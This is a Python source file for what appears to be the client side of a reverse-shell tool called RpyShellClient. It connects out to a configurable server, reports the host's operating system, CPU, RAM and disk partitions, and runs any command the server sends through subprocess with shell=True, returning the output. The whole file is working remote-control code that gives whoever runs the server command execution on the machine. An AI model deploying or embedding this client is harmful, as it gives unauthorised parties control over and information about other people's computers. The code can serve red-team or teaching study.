import socket
import sys
import psutil
import subprocess

class RpyShellClient:
    def __init__(self, host="127.0.0.1", port=8080):
        self.host = host
        self.port = port
        self.bufsize = 1024 * 128
        self.sep = '<S>'
        self.con = self.startClient()

    def startClient(self):
        try:
            s = socket.socket()
            s.connect((self.host, self.port))
        except:
            exit('Error connect() on startClient')
        
        return s

    def checkInfo(self):
        # OS Version
        versionos = sys.platform
        if sys.platform.startswith('freebsd'):
            versionos = 'FreeBSD'
        elif sys.platform.startswith('linux'):
            versionos = 'Linux'
        elif sys.platform.startswith('aix'):
            versionos = 'AIX'
        elif sys.platform.startswith('darwin'):
            versionos = 'MacOSX'
        elif sys.platform.startswith('cygwin'):
            versionos = 'Windows/Cygwin'
        elif sys.platform.startswith('win32'):
            versionos = 'Windows'
        self.versionos = versionos

        # CPU Numbers
        nb_cpu = psutil.cpu_count() # Logical

        # CPU Frequency
        cpu_freq = psutil.cpu_freq() # in MHz

        # RAM 
        ram_memory = round(float(psutil.virtual_memory().total / (1000*1024*1024)),1) # convert in Go 

        # Hard Disk
        disk = self.checkDisk()

        to_send = versionos + self.sep + str(nb_cpu) + self.sep + str(cpu_freq.current) + self.sep + str(ram_memory) + self.sep + str(disk)
        # We send all informations to the server
        self.con.send(str(to_send).encode())

    def checkDisk(self):
        disk = psutil.disk_partitions()
        tmp = ''
        for d in disk:
            tmp = tmp + d.device + ' '
        
        return tmp[0:-1]

    def exec(self,cmd):
        # We remove the 5 first characters 'exec ' to keep only the command
        e = cmd[5:].split()
        p = subprocess.Popen(e, shell=True, encoding='utf-8', universal_newlines=True, stdout=subprocess.PIPE).stdout.read()
        self.con.send(str(p).encode(errors='replace'))

        return p

    def loop(self):
        while True:
            # Client listen for server command
            command = self.con.recv(self.bufsize).decode()
            if command.startswith('info') == True:
                self.checkInfo()
            if command.startswith('exec') == True:
                self.exec(command)
            if command.startswith('exit') == True or command.startswith('quit') == True:
                self.con.close()
                break
    

def main():
    # You can add host / port in the args of RpyShellClient()
    serv = RpyShellClient()
    serv.loop()

if __name__ == "__main__":
    main()